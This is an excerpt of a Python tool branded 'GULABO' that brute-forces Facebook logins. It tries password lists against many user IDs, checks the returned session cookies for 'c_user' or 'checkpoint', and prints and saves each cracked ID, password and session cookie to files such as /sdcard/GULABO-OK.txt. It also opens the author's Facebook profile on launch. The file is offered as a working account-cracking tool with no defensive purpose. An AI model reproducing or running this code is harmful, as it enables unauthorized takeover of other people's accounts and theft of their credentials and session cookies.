...
\033[1;31m░█░░░░█▃▃█░░█░ INDONESIA
\033[1;37m══════════════════════════════════════════
\033[1;32m  •   \033[1;33mCREATED BY\33[0;m   :  \033[1;32mMR SyachPutra78 
\033[1;32m  •   \033[1;32mFACEBOOK      : \033[1;34m Alif Nurdin
\033[1;32m  •   \033[1;36mTOOL VIRSION :  \033[1;36m0.1
\033[1;37m══════════════════════════════════════════\n""")
os.system ('clear')

print("\033[1;32m[•] \033[1;33mWELCOME TO Alif Nurdin....!");time.sleep(0)
os.system("xdg-open https://www.facebook.com/profile.php?id=100076695461489&mibextid=kFxxJD")
def clear ():
	os.system('clear')
	print (logo)
def linex():
...
def Main():
	...
	if GULABO =='5':
		c()
	if GULABO =='0':
		#os.system('xdg-open https://www.facebook.com/GULABO.rajpoot.1100')
...
#def c():
	...
	#if ok =='2':
		#os.system("xdg-open https://www.facebook.com/profile.php?id=100076695461489&mibextid=kFxxJD");Main()
	#if ok =='3':
...
def R():
    ...
    print('\n\033[1;37m(<•>)══════════════════════════════════════════');print('[•] Cloning Complete\n[•] Total OK Ids : '+str(len(oks))+'\n[•] Total CP IDs : '+str(len(cps)));print('\033[1;37m(<•>)══════════════════════════════════════════');print('[•] OK IDS SAVE : /sdcard/GULABO-OK.txt\n[•] CP IDS SAVE : /sdcard/GULABO-CP.txt');input('[•] Press Enter To Back Menu ');Main()
...
class Random:
    ...
    def fbtua(self):
        ...
        try:
            ...
            print("%s\n\033[0;97m[+] \033[0;92mOK RESULTS SAVED IN -> GULABO-OK.txt" % (G))
            print("%s\033[0;97m[+] \033[0;91mCP RESULTS SAVED IN -> GULABO-CP.txt" % (Y))
            print('\n\033[1;37m(•)══════════════════════════════════════════')
    ...
    def api(self, uid, pwx):
        ...
        sys.stdout.write("\r\r %s\033[0;97m[\033[0;92m GULABO \033[0;97m]\033[0;97m  %s\033[0;97m/\033[0;92m%s \033[0;97m[\033[0;92mOK\033[0;91m:\033[0;92m%s\033[0;97m]" % (B, self.loop, len(self.id), len(self.cp)));sys.stdout.flush()
        for pw in pwx:
            pw = pw.lower()
            ...
            if "www.facebook.com" in response.json()["error_msg"]:
                print("\r \033[0;92m[GULABO-OK] %s √ %s\033[0;97m         " % (uid, pw))
                self.cp.append("%s√%s" % (uid, pw))
                open("GULABO-OK.txt", "a").write("  %s√%s\n" % (uid, pw))
                break
            else:
                continue
        self.loop += 1
...
def rcrack1(uid,pwx,tl):
    ...
    'user-agent': pro}
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[7:22]
				print('\33[1;92m[GULABO-OK] '+uid+' √ '+ps+'\33[0;97m')
				print('%s[%sCOOKIE%s] : %s%s ' % (W,Y,W,G,coki))
				
				open('GULABO-OK.txt', 'a').write(uid+' √ '+ps+'\n')
				oks.append(uid);
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\33[1;91m[GULABO-CP] '+uid+' • '+ps+'\33[0;97m')
				open('GULABO-CP.txt', 'a').write(uid+' • '+ps+'\n')
				cps.append(uid)
				break
			else:
				continue
...
def file():
		clear()
		print("\033[1;32m[•]\033[1;37m FOR EXAMPLE: \033[1;32m/sdcard/GULABO.txt");linex()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m[GULABO] %s <•> OK:- \033[1;32m%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m[GULABO-OK] %s √ %s'%(ids,pas))
                                open(f'/sdcard/GULABO-OK.txt', 'a').write(ids+' √ '+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in cp:
                                        print(f'\r\r\033[1;37m[GULABO-CP] '+ids+' • '+pas+'\033[1;97m')
                                        open(f'/sdcard/GULABO-CP.txt', 'a').write(ids+' • '+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
